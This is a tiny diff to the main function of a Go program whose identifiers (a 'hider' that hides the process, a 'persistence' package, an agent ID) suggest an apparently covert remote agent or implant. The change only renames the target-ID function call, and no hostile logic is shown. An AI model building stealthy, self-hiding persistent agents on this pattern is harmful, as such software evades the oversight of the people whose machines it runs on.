@@ -22,7 +22,7 @@ func main() {
 
 	hider.Hide()
 
-	targetId := persistence.GenerateTargetID()
+	targetId := persistence.GeTargetID()
 	err := configInstance.Update(func(c *config.Config) {
 		c.AgentID = targetId
 	})
